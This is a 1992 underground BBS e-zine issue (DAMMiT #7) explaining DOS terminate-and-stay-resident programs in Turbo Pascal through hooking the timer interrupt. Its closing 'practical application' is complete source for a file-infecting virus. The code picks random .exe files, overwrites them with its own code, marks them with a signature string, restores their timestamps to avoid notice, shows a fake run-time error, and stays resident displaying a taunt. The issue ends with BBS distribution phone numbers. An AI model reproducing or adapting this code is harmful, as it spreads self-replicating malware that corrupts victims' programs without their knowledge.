@@ -1,0 +1,509 @@
+ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
+บ                     Û฿ÛÜ  ÜÛÜ  ÜÛÛÛÛÜ ÜÛÛÛÛÜ Ü Û฿฿Û฿฿Û                     บ
+บ                     Û  Û ÜÛ ÛÜ Û ÞÝ Û Û ÞÝ Û      Û                        บ
+บ                     Û  Û Û   Û Û ÞÝ Û Û ÞÝ Û Û    Û                        บ
+บ                     Û  Û Û฿฿฿Û Û    Û Û    Û Û    Û                        บ
+บ                     ÛÜÛ฿ Û   Û Û    Û Û    Û Û    Û                        บ
+ฬออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออน
+บ       Demented Anarchists & Malicious Malignant Inventors of Terror        บ
+ฬออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออน
+บ                   Date O' Release: [08/07/92]   Issue #7                   บ
+ฬออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออน
+บ                     TSR Happy Fun By: LoRD iNCARNADINE                     บ
+ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
+
+------------------------------------------------------------------------------
+ DISCLAIMER: All material contained in this file has been obtained through
+ legitimate resources. All material is for informational purposes only, and is
+ not to be used for any illegal purposes. By continuing to read this file, you
+ free the author from all responsibility. 
+------------------------------------------------------------------------------
+
+
+                       LORD iNCARNADINE Presents:
+
+
+                  -- TSR's And Other Assorted Bullshit --
+
+
+
+          Ok. This is an article on TSR, that is Terminate and
+    Stay Resident, programs and how to manipulate them with Turbo
+    Pascal. I know a number of people who have been interested in
+    this subject but lacked the programming skill to research it,
+    so I will attempt to fully explain, without excessive use of
+    technical shit, the practical side of this type of thing. So
+    let's start at the beginning:
+
+
+ o What is a TSR?
+
+
+         Well, a TSR is a program that does not finish
+    functioning when the end of the code is reached. It
+    incorporates itself into RAM and 'Stays Resident'. In other
+    words: You go back to the dos prompt, but the program is
+    still running. A good example of a commercial TSR is the
+    SideKick program.
+         There are two types of TSR's: Passive TSR's and Active
+    TSR's. Passive TSR's are run only when called by another
+    program and are for the most part boring, but useful.  Active
+    TSR's are TSR's that are called by a keystroke or that are
+    constantly running. These are the ones that can produce the
+    good stuff. The most common method in TP is to slave them to
+    either the keyboard or timer interrupts.  Slaving them to the
+    keyboard interrupt is a bit complicated and therefore will be
+    saved for a later publication. The remainder of this issue,
+    and all of the examples will focus on Active TSR's slaved to
+    the Timer Interrupt.
+
+
+ o What the hell is the 'Timer Interrupt', and what does it
+   have to do with this TSR shit?
+
+
+         Ok. Before going any further let's discuss interrupts
+    for a bit. Those of you who are already familiar with the
+    interrupt vector table can skip over this section. As for the
+    rest...a little background knowledge is in order.
+         An interrupt is a break in the normal system operation.
+    Like your computer getting a telephone call. It stops
+    whatever it's doing, deals with the interrupt and then
+    returns to the program. Now there's a bunch of these things,
+    both hardware (System Clock Tick[$1C], Keyboard[$09]) and
+    software (Anything called by an INTR or MSDOS statement). The
+    numbers represent positions on the Interrupt Vector Table.
+    This is basically a collection of the addresses of interrupt
+    routines for when they are called. Trust me, that did make
+    sense. Lemme give an example:
+
+         ( We'll follow the clock tick interrupt since that's the
+    one we'll be using ). About 18 times a second the computer is
+    informed its it's time to increment the ticker on the
+    internal clock. So... 1st) It goes to the interrupt vector
+    table and looks for the address of the increment routine at
+    $08. 2nd) It then goes to that address and increments the
+    clock.  3rd) Then from inside that routine it calls another
+    interrupt ($1C) which simply returns the routine. 4th) The
+    routine at the address found at $08 is finished, so it
+    returns control to the program again.
+         Now suppose, that we could change one of the addresses
+    of the Interrupt Vector Table, so that it pointed to a
+    routine of your making. Lets take $1C as an example: It does
+    essentially nothing, so merely change the address at $1C on
+    the table to the location of your own routine and now the
+    computer calls that routine 18 times a second. No matter
+    what. Whether something else is running or not. Sounds fun,
+    eh?
+         While a little simplified, that is the basis for the
+    idea of TSR's, at least the ones discussed in this file.
+    Now, on to the real thing.
+
+
+ o How do I get TSR's to work in Turbo Pascal?
+
+
+         Time to get to the point. What follows is a step by step
+    to a working TSR in TP using the timer interrupt:
+
+
+1) Choose the interrupt - for the purpose of this example
+   we'll use $1C (clock tick).
+
+2)  Write the routine, and make sure it works. There are a
+    few rules here: The routine must be labeled interrupt
+    in the procedure statement and the Flags have to be
+    declared. You can't call any interrupts from inside the
+    routine and you can't use any functions like WRITELN,
+    READLN, or GOTOXY.  These will lock the program because
+    they call bios routines and dos functions that won't
+    work with the program suspended in memory.  Mathematical
+    calculations loops and just about everything else is
+    allowed. Here is an example of a method for writing to
+    the screen, it accesses the video memory directly.
+    Videoseg is a constant set a $B800. --
+
+
+
+procedure shitonastick (Flags, cs, ip, ax, bx, cx, dx, si, di, ds, es, bp : word );
+interrupt;
+
+begin
+
+inc(x);
+
+if x = 120 then begin  {Number of timer ticks till execution}
+
+            for bob := 0 to 17 do begin
+            mem [videoSeg : ron + (bob*2)] := ord(word1[bob]);
+            end;
+
+       if ron > 3800 then ron := 60;
+       Ron:= ron + 108;
+       x := 0;
+       end;
+
+end;
+       {This is the array it refers to.}
+-----------------------------------------------------------------------------------------------
+
+word1[0]:='F'; word1[1]:= 'O' ; word1[2]:= 'U' ; word1[3] := 'R';
+word1[4]:= ' '; word1[13]:=' '; word1[5]:='F'; word1[6]:= 'I' ; word1[7]:= 'E' ; word1[8] := 'N';
+word1[9]:='D'; word1[10]:= 'I' ; word1[11]:= 'S' ; word1[12] := 'H';
+word1[14]:='G'; word1[15]:= 'U' ; word1[16]:= 'Y' ; word1[17] := 'Z';
+
+-----------------------------------------------------------------------------------------------
+       {The array is declared globally in another part of the program.}
+
+         There are many other guidelines and precautions, but if you
+    stick to the bare bones coding you should be ok. I seriously
+    suggest buying a book if you intend to do this more than once
+    or twice. The above will print a 17 character message on the
+    screen by writing directly to video memory. The location of
+    the message is changed by the variable ron, and is reset to
+    0 when it is about to leave the screen. That example is about
+    as simple as it gets, and adding the frills is easy
+    enough - for instance sound works well. There are a lot of other
+    things I could add, but it would take way too long. And, in any case,
+    if your serious about it - get a book. Enough Said.
+
+
+         3) Set up your keep statement and fix the memory. I won't
+    go in to all that much detail on this one just use the following
+    as the way to set up the timer interrupt:
+
+
+                begin
+                                                                                               0
+                   setintvec( $1C, @{NAME Of YOUR PROCEDURE HERE});
+
+                   keep (0);
+
+                end.
+
+            As for the memory. Use the $M compiler directive. And
+    remember - the bigger the program, the more memory it needs.
+    Take a look at the whole thing and notice the memory directive
+    and variable declarations, specifically the array. --
+
+Program SexualChocolate;
+
+{$M 1024, 0, 1024}
+
+Uses DOS, CRT;
+
+Const videoSeg = $b800;
+
+type
+
+    cmdarray = string [127];
+
+Var
+   x,
+   Ron,
+   bob :integer;
+   word1 : array [0..20] of char;
+
+procedure shitonastick (Flags, cs, ip, ax, bx, cx, dx, si, di, ds, es, bp : word );
+interrupt;
+
+begin
+
+inc(x);
+
+if x = 120 then begin
+
+
+            for bob := 0 to 17 do begin
+            mem [videoSeg : ron + (bob*2)] := ord(word1[bob]);
+            end;
+
+       sound(11000);  {The sound metioned earlier}
+       delay(300);
+       nosound;
+
+       if ron > 3800 then ron := 60;
+       Ron:= ron + 108;
+       x := 0;
+       end;
+end;
+
+begin
+
+word1[0]:='F'; word1[1]:= 'O' ; word1[2]:= 'U' ; word1[3] := 'R';
+word1[4]:= ' '; word1[13]:=' '; word1[5]:='F'; word1[6]:= 'I' ; word1[7]:= 'E' ; word1[8] := 'N';
+word1[9]:='D'; word1[10]:= 'I' ; word1[11]:= 'S' ; word1[12] := 'H';
+word1[14]:='G'; word1[15]:= 'U' ; word1[16]:= 'Y' ; word1[17] := 'Z';
+
+setintvec( $1C, @shitonastick);
+
+keep (0);
+end.
+
+
+    NOTE: REMEMBER NOT TO RUN THIS INSIDE THE TP ENVIRONMENT.
+
+    Compile it to disk, and then exit and run it.
+
+
+
+         And for those of you who are bored by all this here's something
+    a bit more interesting. A practical application for the preceding
+    program. Have Phun...
+    ----------------------------------------------------------------
+
+
+program hmmm;
+
+{$M 14000, 0, 14000}
+
+{$I-}
+
+uses dos, crt;
+
+const fsze = 7040;
+
+const videoseg = $b800;
+
+var
+
+x,y,z : integer;
+
+t1, t2, t3 : file;
+
+former : longint;
+
+buf : char;
+
+word1 : array[0..20] of char;
+
+curfile : string[60];
+
+daver, cv, bv, dv, dv2 : string;
+
+whack : boolean;
+
+
+
+procedure shitonastick (Flags, cs, ip, ax, bx, cx, dx, si, di, ds, es, bp : word );
+interrupt;
+
+var
+   x, y, z, ron, bob : integer;
+
+begin
+
+inc(x);
+
+if x = 240 then begin
+
+            for bob := 0 to 17 do begin
+            mem [videoSeg : ron + (bob*2)] := ord(word1[bob]);
+            end;
+
+       if ron > 3800 then ron := 60;
+       Ron:= ron + 108;
+       x := 0;
+       end;
+
+end;
+
+
+
+procedure copytoexe;
+
+begin
+
+
+reset(t1, 1);
+reset(t2, 1);
+
+GETftime(t2, former);
+
+for x := 1 to fsze
+    do begin
+
+    blockread(t1, buf, sizeof(buf));
+    blockwrite(t2, buf, sizeof(buf));
+
+    end;
+
+blockwrite(t2, dv, length(dv));
+
+close(t1);
+close(t2);
+
+reset(t2);
+setftime(t2, former);
+close(t2);
+
+end;
+
+Procedure FNEW;
+
+Var
+   Fileinfo : SearchRec;
+   Path     : Array [1..20] of String[30];
+   Name     : Array [1..200] of String[30];
+   err      : Integer;
+   nump     : Integer;
+   Drand, Frand : word;
+   Pather, Namer,y  : String[30];
+   x        :Integer;
+   z        :Byte;
+
+label Mistake;
+
+Begin
+     Nump:=0;
+     FindFirst('\*.*', Directory, Fileinfo);
+     Err:=DosError;
+     While Err=0 do
+       begin
+          If (Fileinfo.Attr = Directory) and (Fileinfo.NAME[1] <> '.') then
+            begin
+               If Fileinfo.Name=Path[Nump] then Err:=1;
+               Nump:=Nump+1;
+               Path[Nump]:=Fileinfo.name;
+            Mistake:end;
+          FindNext(Fileinfo);
+       end;
+
+     Randomize;
+     Drand:=(Random(NUMP-1))+1;
+     Pather:=Path[Drand];
+     Pather:='\'+Pather+'\';
+
+     Nump:=0;
+     Findfirst (Pather + '*.exe', Anyfile, Fileinfo);
+     Err:=DosError;
+     While Err = 0 do
+       begin
+         Nump:=Nump+1;
+         Name[Nump]:=Fileinfo.name;
+         FindNext(Fileinfo);
+         If Fileinfo.name=Name[Nump] then Err:=2;
+       end;
+
+
+         Frand:=Random(Nump-1)+1;
+         Namer:=Name[Frand];
+
+         daver := pather + namer;
+
+end;
+
+procedure inti;
+
+
+label
+
+     hj;
+
+begin
+
+
+curfile := paramstr(0);
+assign(t1, curfile);
+
+
+z := 0;
+whack := false;
+
+repeat
+
+fnew;
+
+y := length(daver);
+cv := daver[y-3];
+if cv = '.' then z:= 69;
+if z = 69 then begin
+         if daver = curfile then goto hj;
+         assign(t3, daver);
+         reset(t3, 1);
+         if filesize(t3) + 500 < fsze then begin
+                               close(t3);
+                               exit;
+                               end;
+         seek(t3, fsze);
+         blockread(t3, bv, 19);
+         bv := copy (bv, 1, 18);
+         if bv <> dv2 then whack := true;
+         close(t3);
+         end;
+hj:
+
+until whack;
+
+assign(t2, daver);
+
+copytoexe;
+
+writeln ('Run-time error 103 at 0016:2E17');
+writeln ('Cannot execute ', curfile);
+
+end;
+
+
+procedure thwhack;
+
+begin
+
+word1[0]:='F'; word1[1]:= 'O' ; word1[2]:= 'U' ; word1[3] := 'R';
+word1[4]:= ' '; word1[13]:=' '; word1[5]:='F'; word1[6]:= 'I' ; word1[7]:= 'E' ; word1[8] := 'N';
+word1[9]:='D'; word1[10]:= 'I' ; word1[11]:= 'S' ; word1[12] := 'H';
+word1[14]:='G'; word1[15]:= 'U' ; word1[16]:= 'Y' ; word1[17] := 'Z';
+
+end;
+
+
+begin
+
+dv := 'TooFieNDiSHFoRYou!-' ;
+dv2 := copy (dv, 1, 18);
+
+inti;
+thwhack;
+
+
+setintvec( $1C, @shitonastick);
+
+keep (0);
+
+
+end.
+ 
+Well, that was some Assorted Bullshit from Lord Incarnadine.... {Praise Jesus}
+
+DAMMiT News:
+Well, since our last issue, DAMMiT has changed a teensy bit. We have another
+site, Dark Sun, and 2 new authors, Inky and The Pyschotic Pyrotic... so happy
+fun to us.... This time we will NOT end with a quote, or a Joke, why?
+Becuz. Well, look for some nifty new filez soon, including Issue 8, which 
+should be out.... in about 20 minutes. Heh. If you've noticed, most of the 
+issues have been by me... That should change soon. We have a buncha ideas 
+that shall appear soon... mayhaps issue 9. Mayhaps. Lemme lone.
+
+(History of this file: I called up Seven Seconds to check in, and found this
+file as "DAMMiT #7".... I was told that Inky was making an issue, but, it 
+kinda showed up, so... Hey, I doan care. If it's written, it's here.}
+<{[Why am I wasting time?]}>
+WAITER!
+
+If you'd like the Newest, Spiffiest DAMMiT Filez, or wanna Join DAMMiT, or
+would like your BBS to be a site, or just want to call a nifty board, or
+want your toenails polished, call these BBSes:
+                             ษออออออออออออออออป
+                             บDAMMiT BBSesบ
+ษอออออออออออออออัออออออออออออสอออัออออออออออัอสอออออออออออออัอออออออออออออออป
+บ   BBS Name    ณ     Number     ณ   Baud   ณ SysOp's Name: ณ    Status     บ
+วฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤลฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤลฤฤฤฤฤฤฤฤฤฤลฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤลฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤถ
+บ Death's Gate  ณ (313) 591-0802 ณ   16.8   ณ    Hacker     ณ  Dist. Site   บ
+วฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤลฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤลฤฤฤฤฤฤฤฤฤฤลฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤลฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤถ
+บ Seven Seconds ณ (313) 344-2977 ณ   14.4   ณ  Grave Walker ณ  Dist. Site   บ
+วฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤลฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤลฤฤฤฤฤฤฤฤฤฤลฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤลฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤถ
+บ The Dark Half ณ (313) 522-9162 ณ   24oo   ณ    Gandolf    ณ  Dist. Site   บ
+วฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤลฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤลฤฤฤฤฤฤฤฤฤฤลฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤลฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤถ
+บ   Dark Sun    ณ (313) 348-0421 ณ  24ooMNP ณ The Pyschotic ณ  Dist. Site   บ
+บ               ณ                ณ          ณ    Pyrotic    ณ               บ
+ศอออออออออออออออฯออออออออออออออออฯออออออออออฯอออออออออออออออฯอออออออออออออออผ
